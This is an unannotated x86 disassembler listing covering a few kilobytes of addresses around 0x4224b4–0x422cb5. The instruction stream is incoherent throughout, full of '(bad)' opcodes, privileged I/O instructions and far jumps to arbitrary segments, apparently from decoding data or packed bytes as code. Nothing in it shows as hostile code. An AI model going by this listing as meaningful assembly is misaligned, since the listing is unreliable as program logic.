  4224b4:	mov    ds:0x4a3504be,eax
  4224b9:	in     eax,0xb4
  4224bb:	aam    0x66
  4224bd:	pop    eax
  4224be:	or     eax,0x10be1487
  4224c3:	scas   eax,DWORD PTR es:[edi]
  4224c4:	add    ch,dl
  4224c6:	dec    edx
  4224c7:	push   0xffffff81
  4224c9:	sub    DWORD PTR [edi+0x2f77d259],edi
  4224cf:	add    al,BYTE PTR [esi-0x32]
  4224d2:	mov    ecx,0xfc27fd61
  4224d7:	mov    ah,0x1b
  4224d9:	mov    ecx,ebx
  4224db:	neg    DWORD PTR [ebx-0xa]
  4224de:	test   eax,0xcd788d62
  4224e3:	stc    
  4224e4:	mov    bh,0xe4
  4224e6:	leave  
  4224e7:	outs   dx,DWORD PTR ds:[esi]
  4224e8:	loop   0x422550
  4224ea:	sub    al,0x6e
  4224ec:	adc    ecx,DWORD PTR [ebx-0x45]
  4224ef:	add    DWORD PTR [eax+0x9b9a813],0xd7eb9a8c
  4224f9:	mov    BYTE PTR [edi],bl
  4224fb:	out    dx,al
  4224fc:	mov    bl,0x88
  4224fe:	and    DWORD PTR [edx],edi
  422500:	rcl    DWORD PTR [esi-0x4a31f798],cl
  422506:	shr    DWORD PTR [edi+0x14],0xf5
  42250a:	repnz imul BYTE PTR es:[edx-0x2a]
  42250f:	ins    DWORD PTR es:[edi],dx
  422510:	sahf   
  422511:	stos   BYTE PTR es:[edi],al
  422512:	loopne 0x422565
  422514:	mov    DWORD PTR [ebx+ebp*4],ecx
  422517:	iret   
  422518:	ins    DWORD PTR es:[edi],dx
  422519:	mov    WORD PTR [edi],?
  42251b:	dec    ebp
  42251c:	mov    bl,BYTE PTR [eax]
  42251e:	inc    esp
  42251f:	xlat   BYTE PTR ds:[ebx]
  422520:	int    0xbc
  422522:	loopne 0x422569
  422524:	into   
  422525:	imul   edi,edi,0x1715f4a8
  42252b:	idiv   DWORD PTR [edi*2-0x6636b1e6]
  422532:	mov    edi,0x2f212673
  422537:	je     0x42257b
  422539:	pop    ds
  42253a:	push   esp
  42253b:	in     eax,dx
  42253c:	dec    ebp
  42253d:	cwde   
  42253e:	stos   DWORD PTR es:[edi],eax
  42253f:	fld    DWORD PTR [ebp-0x3b550eeb]
  422545:	mov    ch,0x9b
  422547:	mov    dl,0x50
  422549:	pop    ebx
  42254a:	add    eax,0x480fb799
  42254f:	lock cmp BYTE PTR [eax],dl
  422552:	call   0x50fd:0x74f36f62
  422559:	sbb    eax,ecx
  42255b:	push   ebp
  42255c:	xchg   edx,eax
  42255d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42255e:	and    al,0xae
  422560:	or     BYTE PTR [ebx],0x6a
  422563:	(bad)  
  422564:	jns    0x42259f
  422566:	jb     0x4224f0
  422568:	pop    edi
  422569:	stc    
  42256a:	jecxz  0x422516
  42256c:	in     al,dx
  42256d:	sbb    eax,0x46f75847
  422572:	sbb    al,BYTE PTR [ebx*4-0x3264e6f0]
  422579:	xchg   edx,eax
  42257a:	and    BYTE PTR [edi*1-0x2eecc388],dh
  422581:	dec    edi
  422582:	adc    cl,dh
  422584:	addr16 inc ecx
  422586:	loop   0x422589
  422588:	xchg   edi,eax
  422589:	sahf   
  42258a:	pop    ebx
  42258b:	idiv   DWORD PTR [esi]
  42258d:	mov    esp,0x90e2fcb9
  422592:	sbb    bl,BYTE PTR [ecx]
  422594:	cmp    ch,BYTE PTR [edx+esi*2-0x22ed9b25]
  42259b:	push   edi
  42259c:	mov    ebp,0xc9eb0d89
  4225a1:	cmp    al,0x86
  4225a3:	jbe    0x422573
  4225a5:	lods   al,BYTE PTR ds:[esi]
  4225a6:	iret   
  4225a7:	jle    0x4225ef
  4225a9:	fdiv   QWORD PTR [edx]
  4225ab:	adc    ecx,edi
  4225ad:	dec    esi
  4225ae:	fmul   DWORD PTR [eax+0x49a1fe47]
  4225b4:	(bad)  
  4225b5:	fcmovne st,st(2)
  4225b7:	test   DWORD PTR [ebx+eiz*1-0x35e44329],eax
  4225be:	fld    DWORD PTR [ecx+0x59]
  4225c1:	and    ah,BYTE PTR [edx+eax*4]
  4225c4:	mov    bl,0x2b
  4225c6:	sbb    esi,DWORD PTR [eax+esi*4+0x3df56651]
  4225cd:	ss add eax,0xedb56228
  4225d3:	jmp    0xaa76a281
  4225d8:	jo     0x42262b
  4225da:	and    BYTE PTR [edx],0x32
  4225dd:	ins    DWORD PTR es:[edi],dx
  4225de:	nop
  4225df:	imul   ebx,ebp,0xa204f6bb
  4225e5:	push   ebx
  4225e6:	mov    esi,0x87aea2cf
  4225eb:	sub    DWORD PTR [eax-0x7e],ebx
  4225ee:	jbe    0x4225a3
  4225f0:	mov    DWORD PTR [edi+0x2ee4a2e6],edi
  4225f6:	bound  ecx,QWORD PTR fs:[esi+0x3d]
  4225fa:	cmp    BYTE PTR [ebx],ah
  4225fc:	lds    esp,FWORD PTR [edi+ebp*8]
  4225ff:	ficomp WORD PTR ds:0x8b8c0bac
  422605:	sti    
  422606:	xor    BYTE PTR [esi],ah
  422608:	arpl   WORD PTR [esi+ebp*8+0x6e],ax
  42260c:	and    al,0x92
  42260e:	inc    ebx
  42260f:	xchg   ecx,eax
  422610:	es inc eax
  422612:	nop
  422613:	cmc    
  422614:	or     al,0xc5
  422616:	repnz loopne 0x422636
  422619:	dec    esp
  42261a:	ret    
  42261b:	mov    al,ds:0xf82b2c1
  422620:	std    
  422621:	lea    ecx,[ebp-0x6ef0600a]
  422627:	lock addr16 mov bh,0x0
  42262b:	call   0xf484b5ba
  422630:	push   0x54
  422632:	in     al,dx
  422633:	ins    DWORD PTR es:[edi],dx
  422634:	push   es
  422635:	xchg   ecx,eax
  422636:	test   DWORD PTR [edx+0x6590234a],edx
  42263c:	xchg   edi,eax
  42263d:	mov    edi,DWORD PTR [ecx+0x4143a654]
  422643:	cmp    DWORD PTR [ebx],ebx
  422645:	cmp    edx,DWORD PTR [edx+edi*1]
  422648:	(bad)  
  422649:	popf   
  42264a:	stc    
  42264b:	daa    
  42264c:	xchg   BYTE PTR [edi-0x2f],cl
  42264f:	sbb    cl,dl
  422651:	jns    0x4225ec
  422653:	jno    0x422608
  422655:	mov    BYTE PTR [esp+esi*2+0x51],0x65
  42265a:	sub    dh,BYTE PTR [esi+0x79]
  42265d:	and    DWORD PTR [ebx-0x16],edi
  422660:	rcl    DWORD PTR [edx-0x2119e33a],cl
  422666:	call   0x36514783
  42266b:	fwait
  42266c:	pop    ebp
  42266d:	xlat   BYTE PTR ds:[ebx]
  42266e:	sbb    al,0xa0
  422670:	inc    esp
  422671:	push   eax
  422672:	(bad)  
  422673:	pop    esi
  422674:	inc    edi
  422675:	mov    ecx,0x5cf73b2
  42267a:	xor    BYTE PTR [eax+0x26cdfee2],al
  422680:	fisubr DWORD PTR [edi]
  422682:	jb     0x4226a6
  422684:	xchg   ebx,eax
  422685:	ret    0xf5b7
  422688:	int3   
  422689:	mov    BYTE PTR [edx+0x4],cl
  42268c:	sub    ah,ch
  42268e:	add    BYTE PTR [ebp+0x14],bl
  422691:	ret    
  422692:	mov    edi,0xf139f7a9
  422697:	pop    ebp
  422698:	call   0x5a67:0xad1e04a3
  42269f:	xchg   DWORD PTR ds:0x9509f5d6,edx
  4226a5:	add    eax,DWORD PTR [eax+eax*8]
  4226a8:	aaa    
  4226a9:	mov    al,0xa7
  4226ab:	retf   0x327b
  4226ae:	xchg   ebx,eax
  4226af:	mov    esp,0x69456bf3
  4226b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226b5:	push   0x26
  4226b7:	jbe    0x422701
  4226b9:	pop    ebp
  4226ba:	sbb    bl,BYTE PTR [ebp-0x4ffc61d8]
  4226c0:	imul   esi,DWORD PTR [ebx],0x37
  4226c3:	cmc    
  4226c4:	and    ch,ah
  4226c6:	jl     0x422682
  4226c8:	into   
  4226c9:	mov    esp,0xe2473794
  4226ce:	ins    DWORD PTR es:[edi],dx
  4226cf:	push   es
  4226d0:	add    al,0xe0
  4226d2:	xor    ecx,0x948a5b86
  4226d8:	xor    dh,BYTE PTR [esi+0x18]
  4226db:	(bad)  
  4226dc:	pop    ebx
  4226dd:	popa   
  4226de:	shr    BYTE PTR [edi+0x1f29ccf9],1
  4226e4:	sub    esp,ebx
  4226e6:	xchg   edi,eax
  4226e7:	sbb    bl,dh
  4226e9:	lahf   
  4226ea:	aas    
  4226eb:	mov    eax,0xcbc4b15d
  4226f0:	push   ds
  4226f1:	jg     0x422733
  4226f3:	stos   BYTE PTR es:[edi],al
  4226f4:	sahf   
  4226f5:	loop   0x42273e
  4226f7:	mov    esp,0xd76452f1
  4226fc:	xchg   edi,eax
  4226fd:	mov    DWORD PTR [edx-0xc6778f9],eax
  422703:	fmul   DWORD PTR [ebx]
  422705:	mov    ds:0x57d6eaa7,al
  42270a:	cdq    
  42270b:	fdiv   QWORD PTR [ecx]
  42270d:	icebp  
  42270e:	lea    esi,[eax+edi*1-0x2d]
  422712:	lods   eax,DWORD PTR ds:[esi]
  422713:	sbb    DWORD PTR [ecx-0x70],edi
  422716:	xchg   edx,eax
  422717:	call   0x1e1c:0x37056637
  42271e:	mov    bh,dl
  422720:	xor    eax,0xb1a6baf7
  422725:	and    esp,DWORD PTR [edi+eax*4+0x75b0e445]
  42272c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42272d:	sub    BYTE PTR [esi],bh
  42272f:	jmp    0x462b:0x5c8d8dcf
  422736:	mov    esi,DWORD PTR [ecx+0x7a]
  422739:	retf   
  42273a:	sub    ecx,DWORD PTR [ebp-0x560811c7]
  422740:	push   ss
  422741:	cmp    eax,DWORD PTR [edi+ecx*1-0x5]
  422745:	mov    DWORD PTR [edx],edx
  422747:	or     al,0xe
  422749:	cmp    DWORD PTR [eax+0x33da3a70],esi
  42274f:	retf   0xc568
  422752:	scas   al,BYTE PTR es:[edi]
  422753:	adc    al,0x8
  422755:	push   ecx
  422756:	shl    BYTE PTR [esp+eiz*2+0x3c],1
  42275a:	outs   dx,DWORD PTR ds:[esi]
  42275b:	(bad)  
  42275d:	mov    ah,0x46
  42275f:	aaa    
  422760:	retf   
  422761:	popf   
  422762:	jne    0x4227a5
  422764:	push   esp
  422765:	lock mov dh,0xdf
  422768:	fld    st(3)
  42276a:	imul   ebx,edi,0x859988e5
  422770:	scas   eax,DWORD PTR es:[edi]
  422771:	leave  
  422772:	or     dh,ch
  422774:	push   es
  422775:	std    
  422776:	lea    edi,[ebx+ebx*1+0x5ae1df54]
  42277d:	stos   DWORD PTR es:[edi],eax
  42277e:	jl     0x42278c
  422780:	xchg   edx,eax
  422781:	cmp    edx,DWORD PTR [esi+0x41]
  422784:	push   esp
  422785:	hlt    
  422786:	popf   
  422787:	xor    eax,DWORD PTR [ecx+0x665b63c8]
  42278d:	in     eax,0xe3
  42278f:	das    
  422790:	test   eax,0xf04ef845
  422795:	inc    edx
  422796:	or     DWORD PTR [edx-0x463b7a77],0x4b
  42279d:	je     0x4227e4
  42279f:	stos   BYTE PTR es:[edi],al
  4227a0:	jbe    0x4227f4
  4227a2:	or     bh,BYTE PTR [esi-0x1b]
  4227a5:	xchg   esi,eax
  4227a6:	cmp    ebp,ecx
  4227a8:	aaa    
  4227a9:	add    ebp,DWORD PTR [esi-0x70]
  4227ac:	adc    edx,DWORD PTR [ebp-0x33]
  4227af:	mov    eax,ds:0x1c3e77cd
  4227b4:	stos   BYTE PTR es:[edi],al
  4227b5:	loopne 0x42279e
  4227b7:	imul   ebx,DWORD PTR [ebx+0x1c],0x609cb32f
  4227be:	sub    eax,0x8e8761c
  4227c3:	pushf  
  4227c4:	mov    ds:0x12fa9e35,eax
  4227c9:	adc    al,0xf7
  4227cb:	lahf   
  4227cc:	adc    BYTE PTR [bx+si-0x2e],cl
  4227d0:	push   0xc9bccb39
  4227d5:	and    DWORD PTR [ecx],ebp
  4227d7:	push   ds
  4227d8:	lods   eax,DWORD PTR ds:[esi]
  4227d9:	imul   ecx,DWORD PTR [edi-0x599c55a2],0x2e
  4227e0:	(bad)  
  4227e1:	daa    
  4227e2:	retf   0x899d
  4227e5:	cmp    DWORD PTR [eax+0x1d3e3f55],0xc61aff5d
  4227ef:	mov    edi,0x2a82cb7c
  4227f4:	jb     0x422788
  4227f6:	inc    ecx
  4227f7:	js     0x4227a6
  4227f9:	mov    edi,0xb76c7afe
  4227fe:	daa    
  4227ff:	test   eax,0x83c4abb4
  422804:	ds sahf 
  422806:	add    dl,BYTE PTR [ebx-0x28]
  422809:	cmp    bl,BYTE PTR [eax+esi*8]
  42280c:	pusha  
  42280d:	xor    al,0x39
  42280f:	inc    bh
  422811:	cdq    
  422812:	and    eax,0xb6a205ae
  422817:	inc    esi
  422818:	(bad)  
  422819:	imul   edi,DWORD PTR [edx+0x3e06781],0x8588b2f7
  422823:	and    BYTE PTR ds:0xd18c7b60,ch
  422829:	jge    0x42284f
  42282b:	xchg   BYTE PTR [eax-0x4c],bh
  42282e:	loop   0x4227c0
  422830:	pop    ds
  422831:	loope  0x42289f
  422833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422834:	sbb    BYTE PTR [edi],ah
  422836:	cmp    eax,0x6592ea50
  42283b:	xor    DWORD PTR [ecx-0x3f],eax
  42283e:	scas   al,BYTE PTR es:[edi]
  42283f:	sub    BYTE PTR [ebp+0x47],ah
  422842:	lods   eax,DWORD PTR ds:[esi]
  422843:	xor    BYTE PTR [ebp-0x15db17fb],ah
  422849:	shr    DWORD PTR [esi+0x6161511c],0x59
  422850:	pop    es
  422851:	outs   dx,BYTE PTR ds:[esi]
  422852:	ret    
  422853:	mov    cl,0xc2
  422855:	(bad)
  422858:	pushf  
  422859:	jecxz  0x42286a
  42285b:	mov    bh,0x80
  42285d:	cmp    BYTE PTR [edx+0x6688de6a],bh
  422863:	inc    ebx
  422864:	mov    ecx,0x44decac4
  422869:	mov    al,ds:0x316fcdbf
  42286e:	jo     0x422808
  422870:	sbb    edi,DWORD PTR [ebx+ebx*8-0x4]
  422874:	push   ebp
  422875:	stc    
  422876:	(bad)  
  422877:	mov    bl,0xe9
  422879:	cmp    eax,0x19c62da2
  42287e:	cmp    bl,BYTE PTR [esi+0x1c]
  422881:	call   0x224e:0xe16b3a30
  422888:	lods   al,BYTE PTR ds:[esi]
  422889:	xchg   edx,ecx
  42288b:	nop
  42288c:	mov    cs,edi
  42288e:	add    edx,esp
  422890:	sbb    eax,0x20b6f21d
  422895:	inc    ebx
  422896:	adc    esp,DWORD PTR [ecx]
  422898:	nop
  422899:	call   0xfcbf:0xccc32705
  4228a0:	frstor [edi]
  4228a2:	adc    al,0x1
  4228a4:	inc    ebx
  4228a5:	xor    ecx,DWORD PTR [ebx-0x42a64653]
  4228ab:	sbb    edx,DWORD PTR [ebp-0x7c302f83]
  4228b1:	aaa    
  4228b2:	rcr    DWORD PTR [esi+0x8],0x6a
  4228b6:	jl     0x422913
  4228b8:	pusha  
  4228b9:	aas    
  4228ba:	xchg   ecx,eax
  4228bb:	das    
  4228bc:	(bad)  
  4228bd:	retf   0x1aef
  4228c0:	and    al,0xf2
  4228c2:	xchg   edi,eax
  4228c3:	jae    0x422890
  4228c5:	pusha  
  4228c6:	pop    ebp
  4228c7:	push   ss
  4228c8:	jp     0x422937
  4228ca:	idiv   DWORD PTR [ebp-0x62]
  4228cd:	cli    
  4228ce:	je     0x422878
  4228d0:	or     eax,0xd0356cdb
  4228d5:	repz mov gs:0x23a4f3ce,al
  4228dc:	sub    edx,ecx
  4228de:	aaa    
  4228df:	pop    eax
  4228e0:	cmp    eax,0x61505b76
  4228e5:	mov    ebx,0x19a3d399
  4228ea:	aam    0xa7
  4228ec:	lock xchg DWORD PTR [ecx],ebp
  4228ef:	repz xor al,0x7c
  4228f2:	mov    al,0xe4
  4228f4:	dec    esi
  4228f5:	xchg   ebp,eax
  4228f6:	xchg   ebp,eax
  4228f7:	int    0xc9
  4228f9:	(bad)  
  4228fa:	cmp    ch,BYTE PTR [eax+0x38]
  4228fd:	xchg   esi,eax
  4228fe:	pop    esi
  4228ff:	mov    bl,0x74
  422901:	outs   dx,DWORD PTR ds:[esi]
  422902:	mov    eax,0xeb603d4c
  422907:	test   BYTE PTR [ebx+0x5036bd41],ch
  42290d:	cmp    al,0x83
  42290f:	cs mov ebp,0x91ca68c8
  422915:	pop    esp
  422916:	mov    ds:0xa2711ed5,al
  42291b:	cvtpi2ps xmm5,QWORD PTR [esi-0x7ade452b]
  422922:	retf   0x9ccb
  422925:	in     eax,dx
  422926:	xchg   esi,eax
  422927:	xchg   DWORD PTR [esi+0x332360e8],edx
  42292d:	xor    BYTE PTR [esi+ecx*4],ah
  422930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422931:	inc    eax
  422932:	cmp    BYTE PTR [ebp+0x653ece6],0x37
  422939:	and    ch,ah
  42293b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42293c:	lods   eax,DWORD PTR ds:[esi]
  42293d:	inc    esp
  42293e:	mov    eax,ds:0x8d56fcca
  422943:	push   cs
  422944:	dec    eax
  422945:	popa   
  422946:	or     BYTE PTR [ecx],ch
  422948:	test   DWORD PTR [edx],esi
  42294a:	xchg   ebx,eax
  42294b:	data16 jns 0x422923
  42294e:	sub    esp,DWORD PTR [esi-0xb873fa9]
  422954:	ds das 
  422956:	add    edx,edx
  422958:	mov    ds:0x144ce037,eax
  42295d:	mov    ecx,0x89206350
  422962:	dec    esi
  422963:	rcr    bh,1
  422965:	jno    0x4229b3
  422967:	out    dx,eax
  422968:	lods   eax,DWORD PTR ds:[esi]
  422969:	jns    0x422905
  42296b:	xor    DWORD PTR [edi+0x20],ecx
  42296e:	adc    edi,DWORD PTR [ebp-0x34a42d07]
  422974:	jb     0x4229b0
  422976:	mov    dh,0x8a
  422978:	mov    fs,WORD PTR [edx-0x71]
  42297b:	push   es
  42297c:	int3   
  42297d:	(bad)  
  42297f:	int3   
  422980:	push   0xea93333c
  422985:	mov    edx,0xaf5f8cac
  42298a:	add    BYTE PTR [eax-0x9],0x18
  42298e:	jp     0x422a01
  422990:	pop    edi
  422991:	pop    es
  422992:	dec    ebp
  422993:	int    0xda
  422995:	inc    ecx
  422996:	jl     0x422931
  422998:	idiv   DWORD PTR [edi-0x3fb2b6b9]
  42299e:	sub    al,0x97
  4229a0:	xchg   esp,eax
  4229a1:	div    DWORD PTR [ecx]
  4229a3:	mov    ecx,0xbc6b7cb8
  4229a8:	ss lock mov edx,0x9955212a
  4229af:	jecxz  0x4229b6
  4229b1:	lahf   
  4229b2:	mov    ?,WORD PTR [ecx+0x3ec9c57e]
  4229b8:	retf   0x930c
  4229bb:	fsubr  DWORD PTR [ebx+0x4cb6b8cc]
  4229c1:	fwait
  4229c2:	or     BYTE PTR [edi-0x6d43987f],dl
  4229c8:	jbe    0x42294e
  4229ca:	imul   edi,DWORD PTR [eax-0x1f6609b8],0x79
  4229d1:	or     eax,DWORD PTR [edx]
  4229d3:	add    al,BYTE PTR [edx+ecx*8]
  4229d6:	fcom   QWORD PTR [edx]
  4229d8:	loop   0x422999
  4229da:	xor    eax,0x957f7a28
  4229df:	ds (bad) 
  4229e1:	xchg   edi,eax
  4229e2:	ja     0x4229f6
  4229e4:	jne    0x422a64
  4229e6:	pop    esi
  4229e7:	mov    bl,BYTE PTR [ecx-0x6d3ddfa8]
  4229ed:	stos   BYTE PTR es:[edi],al
  4229ee:	aad    0x10
  4229f0:	cmp    al,0xff
  4229f2:	loop   0x422a49
  4229f4:	es inc edi
  4229f6:	inc    esp
  4229f7:	push   0xa97e907d
  4229fc:	popa   
  4229fd:	push   ss
  4229fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229ff:	pop    ds
  422a00:	fcmove st,st(3)
  422a02:	sub    DWORD PTR [ecx+0x7d9d4b84],ebp
  422a08:	sbb    BYTE PTR [edx],0x27
  422a0b:	jg     0x422990
  422a0d:	fdivr  QWORD PTR [ebp+0x78d24fea]
  422a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a14:	and    DWORD PTR [ebp-0x42e1feaf],esi
  422a1a:	push   ebp
  422a1b:	pop    ebx
  422a1c:	or     eax,0x42ace129
  422a21:	aad    0xf4
  422a23:	xor    BYTE PTR [ebx+0x374e1712],al
  422a29:	pop    eax
  422a2a:	in     eax,dx
  422a2b:	mov    DWORD PTR [esi-0x6b],ecx
  422a2e:	icebp  
  422a2f:	xchg   esi,eax
  422a30:	enter  0x8b33,0x4d
  422a34:	dec    edx
  422a35:	cmp    ch,BYTE PTR [eax]
  422a37:	out    0xe6,al
  422a39:	js     0x422a83
  422a3b:	add    BYTE PTR [eax-0x3c1c424d],bl
  422a41:	in     al,0x38
  422a43:	inc    ecx
  422a44:	lahf   
  422a45:	fld    DWORD PTR ss:[esp+eiz*4-0x59]
  422a4a:	and    eax,0x204982ff
  422a4f:	cmp    DWORD PTR [eax+0x76d4f518],edx
  422a55:	add    BYTE PTR [edi],dl
  422a57:	pop    eax
  422a58:	lea    eax,[ebx+0x3d]
  422a5b:	rol    BYTE PTR [edx+0x30aa8ceb],0xd2
  422a62:	push   ebx
  422a63:	xor    dl,BYTE PTR [edx+0x35]
  422a66:	cmp    ecx,esi
  422a68:	loop   0x422a0f
  422a6a:	ins    BYTE PTR es:[edi],dx
  422a6b:	xor    DWORD PTR [ebx+0x1a],esp
  422a6e:	ror    DWORD PTR [esi],1
  422a70:	out    0xcd,al
  422a72:	dec    ebp
  422a73:	dec    esp
  422a74:	call   0x52e42635
  422a79:	and    ebx,DWORD PTR [ebx+0x6a34aec]
  422a7f:	loopne 0x422a25
  422a81:	std    
  422a82:	xchg   DWORD PTR [edx],edx
  422a84:	int3   
  422a85:	imul   edx,eax,0x44
  422a88:	retf   
  422a89:	hlt    
  422a8a:	add    BYTE PTR ds:0xf70146ed,cl
  422a90:	and    ebx,esi
  422a92:	es jge 0x422a8a
  422a95:	call   0xeb2b:0x2b33165a
  422a9c:	aaa    
  422a9d:	push   esp
  422a9e:	arpl   WORD PTR [edi],bx
  422aa0:	mov    ds:0xbc949a41,al
  422aa5:	pop    ebp
  422aa6:	std    
  422aa7:	add    esi,DWORD PTR [ecx+0x67]
  422aaa:	pop    ecx
  422aab:	shr    BYTE PTR [edi],0x68
  422aae:	aad    0x89
  422ab0:	adc    eax,0x65109faa
  422ab5:	lahf   
  422ab6:	xchg   cl,dh
  422ab8:	xchg   BYTE PTR [ecx+0x1b],bh
  422abb:	mov    edi,0xe640faf8
  422ac0:	jmp    0x8acf:0x620c7e43
  422ac7:	inc    esi
  422ac8:	jno    0x422abe
  422aca:	inc    esi
  422acb:	ret    0xd34e
  422ace:	aas    
  422acf:	jo     0x422afc
  422ad1:	in     eax,dx
  422ad2:	pop    ds
  422ad3:	int    0x1b
  422ad5:	ds lock or eax,0xe11d8039
  422adc:	(bad)  
  422add:	mov    eax,0xbdaa85e8
  422ae2:	cld    
  422ae3:	xchg   edx,eax
  422ae4:	shl    al,1
  422ae6:	pop    es
  422ae7:	aam    0xd
  422ae9:	outs   dx,BYTE PTR ds:[esi]
  422aea:	adc    BYTE PTR [edx-0x69],al
  422aed:	inc    ebx
  422aee:	pop    es
  422aef:	imul   edx,DWORD PTR [ebx-0x60],0xd60bd6c1
  422af6:	cli    
  422af7:	ins    BYTE PTR es:[edi],dx
  422af8:	dec    ebp
  422af9:	dec    ecx
  422afa:	repz xchg edi,eax
  422afc:	mov    eax,ds:0x5987c45f
  422b01:	test   DWORD PTR [edi],ecx
  422b03:	test   DWORD PTR [esi-0x1b],ebp
  422b06:	add    DWORD PTR [ebx-0x58c04d56],esi
  422b0c:	iret   
  422b0d:	mov    ds:0xedd8ae81,eax
  422b12:	mov    ?,WORD PTR [esi]
  422b14:	test   BYTE PTR [edi-0x17],bl
  422b17:	pop    esp
  422b18:	and    eax,0x26ccc6b6
  422b1d:	pusha  
  422b1e:	shl    al,cl
  422b20:	mov    edi,0xda9ebba3
  422b25:	push   esp
  422b26:	int3   
  422b27:	aaa    
  422b28:	(bad)  
  422b29:	frstor [edx+0x211cb683]
  422b2f:	or     esp,DWORD PTR [eax+ebx*4]
  422b32:	cli    
  422b33:	mov    ds:0x3dfa5b04,al
  422b38:	mov    eax,ds:0xa3a65dd4
  422b3d:	cmp    ebx,DWORD PTR [esi+ecx*8]
  422b40:	or     dl,BYTE PTR [edx+0x37]
  422b43:	sahf   
  422b44:	fadd   DWORD PTR [esi]
  422b46:	sub    ebp,edi
  422b48:	adc    DWORD PTR [ebx+0x60d9d30e],edi
  422b4e:	sar    DWORD PTR [eax],cl
  422b50:	mov    ebx,0x718254e2
  422b55:	mov    ebx,0xb7a89d4b
  422b5a:	pusha  
  422b5b:	pop    ebp
  422b5c:	cmp    al,BYTE PTR [edx+0x15192516]
  422b62:	adc    eax,0xcd80954d
  422b67:	pop    ebp
  422b68:	cmp    al,0xa9
  422b6a:	adc    eax,0x8114da0d
  422b6f:	in     eax,0x80
  422b71:	sti    
  422b72:	or     esp,ecx
  422b74:	test   al,0xe4
  422b76:	jo     0x422baf
  422b78:	pushf  
  422b79:	push   es
  422b7a:	ja     0x422b92
  422b7c:	add    dh,0x33
  422b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b80:	lea    ebx,[edi-0x17]
  422b83:	cdq    
  422b84:	loope  0x422b66
  422b86:	lods   al,BYTE PTR ds:[esi]
  422b87:	mov    ?,WORD PTR [ecx+0x6af55c59]
  422b8d:	mov    esi,0xe4b90f9
  422b92:	dec    esi
  422b93:	push   0x1
  422b95:	cld    
  422b96:	push   0xfffffff5
  422b98:	adc    BYTE PTR [eax-0x5bf2f59f],0x78
  422b9f:	iret   
  422ba0:	retf   0x20ad
  422ba3:	xchg   edx,eax
  422ba4:	or     dl,BYTE PTR [ebx]
  422ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ba7:	pop    eax
  422ba8:	add    BYTE PTR [ecx],dl
  422baa:	cdq    
  422bab:	sbb    eax,0xf1f8a3e
  422bb0:	int    0xd
  422bb2:	push   ebp
  422bb3:	xor    dl,BYTE PTR [esi]
  422bb5:	mov    dl,BYTE PTR [edx-0x3e8855fc]
  422bbb:	add    eax,0xe8472117
  422bc0:	daa    
  422bc1:	adc    ebx,ecx
  422bc3:	sbb    DWORD PTR [eax+ecx*8+0x2],esi
  422bc7:	xchg   esp,eax
  422bc8:	test   esp,ecx
  422bca:	ret    0xb395
  422bcd:	mov    ds,esi
  422bcf:	sub    ebx,DWORD PTR [ebx-0x630219f7]
  422bd5:	dec    edi
  422bd6:	test   al,0x95
  422bd8:	and    ebx,DWORD PTR [edi+0x3e]
  422bdb:	fdiv   QWORD PTR [edx+0x1858d584]
  422be1:	test   BYTE PTR [edx-0x7a],dl
  422be4:	mov    ds:0xa34d66dd,al
  422be9:	sbb    eax,0x55e63581
  422bee:	jg     0x422c15
  422bf0:	idiv   BYTE PTR [edx]
  422bf2:	xlat   BYTE PTR ds:[ebx]
  422bf3:	fnclex 
  422bf5:	pop    eax
  422bf6:	mov    dl,0x58
  422bf8:	in     al,dx
  422bf9:	push   0x53
  422bfb:	inc    eax
  422bfc:	into   
  422bfd:	mov    al,ds:0xbaa80298
  422c02:	mov    ds:0x67e37e5f,al
  422c07:	mov    al,ch
  422c09:	in     al,0x5e
  422c0b:	jo     0xbe68c32
  422c11:	and    ebp,esi
  422c13:	retf   0x8999
  422c16:	mov    ebx,0x95790ac8
  422c1b:	out    dx,al
  422c1c:	imul   edi,DWORD PTR [esi+edi*8+0x1c397cb8],0xfffffff2
  422c24:	std    
  422c25:	into   
  422c26:	inc    ebx
  422c27:	and    ah,BYTE PTR [eax+0x0]
  422c2a:	popf   
  422c2b:	cmp    bh,al
  422c2d:	loop   0x422bb0
  422c2f:	xchg   ebx,eax
  422c30:	test   eax,0x51b5a802
  422c35:	les    eax,FWORD PTR [eax+ebp*8-0x17]
  422c39:	adc    esi,esi
  422c3b:	out    0xb1,al
  422c3d:	cmp    esp,ecx
  422c3f:	leave  
  422c40:	icebp  
  422c41:	icebp  
  422c42:	js     0x422c02
  422c44:	stos   BYTE PTR es:[edi],al
  422c45:	xor    DWORD PTR [edi+0x2d2d32a0],ebp
  422c4b:	xchg   edi,eax
  422c4c:	jne    0x422bf2
  422c4e:	repz inc edi
  422c50:	retf   0x291f
  422c53:	cwde   
  422c54:	aam    0x3d
  422c56:	sub    edi,DWORD PTR [ebp-0x74edb591]
  422c5c:	ins    BYTE PTR es:[edi],dx
  422c5d:	ficom  WORD PTR [ecx-0x71637e98]
  422c63:	enter  0xc201,0x59
  422c67:	sti    
  422c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c69:	mov    ds:0x7dde47b4,al
  422c6e:	mov    esp,0x6499ca71
  422c73:	or     al,0xb4
  422c75:	and    eax,0xaa2f93b9
  422c7a:	rcr    DWORD PTR [ebp-0x71681ec0],1
  422c80:	dec    ecx
  422c81:	jmp    0xb9dc:0x13db1a93
  422c88:	(bad)
  422c8c:	jne    0x422ccb
  422c8e:	es jge 0x422c8f
  422c91:	cmp    BYTE PTR [ebx-0x38],ah
  422c94:	out    dx,eax
  422c95:	cmc    
  422c96:	dec    ebx
  422c97:	retf   
  422c98:	mov    esp,0x9b5f09d9
  422c9d:	xchg   esp,eax
  422c9e:	xor    eax,0xea61d60a
  422ca3:	lock jecxz 0x422cda
  422ca6:	push   cs
  422ca7:	clc    
  422ca8:	jg     0x422d07
  422caa:	xchg   edi,eax
  422cab:	xchg   DWORD PTR [ecx-0x35],ebp
  422cae:	pop    ebx
  422caf:	sbb    DWORD PTR [edi+0x5f2ea231],esi
  422cb5:	in     al,0xfe
